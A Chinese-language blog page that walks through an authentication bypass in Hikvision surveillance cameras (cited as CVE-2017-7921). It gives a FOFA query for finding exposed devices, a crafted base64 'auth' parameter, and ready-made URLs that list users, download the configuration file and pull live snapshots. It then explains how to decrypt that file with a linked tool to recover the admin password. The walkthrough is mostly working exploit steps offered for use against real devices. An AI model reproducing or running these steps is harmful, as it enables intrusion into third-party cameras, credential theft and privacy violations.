---
layout: about
category: about
Researchname: Hikvision-ConfigurationFiles-decrypter
author: Bin4xin
permalink: /about/Hikvision-ConfigurationFiles-decrypter/
---

> *fofa： app="HIKVISION-视频监控"*
>
> *HIKVISION*监控设备管理后台存在未授权，通过构造url可绕过登录查看监控，检索所有用户和配置文件下载。

构造url主要是通过如下的`auth`参数构造生成base64加密字段，如下所示：

```bash
➜  echo admin:11 |base64
YWRtaW46MTEK
```

<h2><li>检索所有用户及其角色的列表</li></h2>
`http://{ip.addr}:{ip.port}/Security/users?auth=YWRtaW46MTEK`

返回xml信息：

```xml
<UserList version="1.0">
<User version="1.0">
<id>1</id>
<userName>admin</userName>
<priority>high</priority>
<ipAddress>0.0.0.0</ipAddress>
<macAddress>00:00:00:00:00:00</macAddress>
<userLevel>Administrator</userLevel>
</User>
</UserList>
```

---

<h2><li>下载账号密码配置文件</li> </h2>


`http://{ip.addr}:{ip.port}/System/configurationFile?auth=YWRtaW46MTEK`

```bash
➜  file configurationFile
configurationFile: PGP Secret Key -
```

如上，我们配置文件下载完成后可以看到是PGP加密文件，所以我们需要对文件进行解密才可以找到账号密码的配置信息；文件解密出的账号密码就是监控设备后台管理的账号密码信息，我们得到信息直接登录即可。解密软件用法及链接如下：

### *# Usage:*

<div class="col-lg-7">
<img align="left" src="https://i.loli.net/2021/11/18/l5mtUa13gvqVHLF.png"/>
</div>

<div>

<h3> <em>Open [hikvision-decrypter.exe] on Windows platform:</em> </h3>

<li><code>Open Configuration File -> </code></li>

<li><code>Encrypted -> </code></li>

<li><code>Decrypt Data(Decrypting AES...) -> </code></li>

<li><code>(Successfully decrypted data) -> </code></li>

<li><code>Save Configuration File. </code></li>


</div>

### *# Find pass in decrypted data*

用 010-Editor程序打开decrypted data 文件. 文件内搜索admin字符串，如左图；

**Boom! Easy to find password! (admin:asdf1234)**

<span style="margin-left: 1em">* 我们通过[Usage]来获得的帐号密码登录即可，有机会会从代码角度分析一下为什么存在未授权访问</span>

### *#* 相关链接一览表

|Desc | Link |
| :----: | :----: |
---- | --- 
Download Hikvision exec |  [<i class="fa fa-link"></i> hikvision-decrypter.exe](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Hikvision%20Unauth/hikvision-decrypter.exe){:target="_blank"} and here is: [<i class="fa fa-github"></i> Repos](https://github.com/WormChickenWizard/hikvision-decrypter){:target="_blank"}
Download configurationFile Sample | [<i class="fa fa-link"></i> configurationFile](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Hikvision%20Unauth/configurationFile-fofa){:target="_blank"}
Download configurationFile decry-Sample	| [<i class="fa fa-link"></i> configurationFile-decry](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Hikvision%20Unauth/DE-configurationFile-fofa){:target="_blank"}

---

<h3><li>获取监控快照</li></h3>

`http://{ip.addr}:{ip.port}/onvif-http/snapshot?auth=YWRtaW46MTEK`

当前时间下监控的快照图片

![Hikvision-unauth-view.png](https://i.loli.net/2021/11/18/GPEeKkcqsAFRDYO.png)


## 参考

- [CVE-2017-7921海康威视摄像头管理后台未授权](https://www.freebuf.com/vuls/268245.html){:target="_blank"}
- [Hikvision Decrypter](https://github.com/WormChickenWizard/hikvision-decrypter){:target="_blank"}


以上。
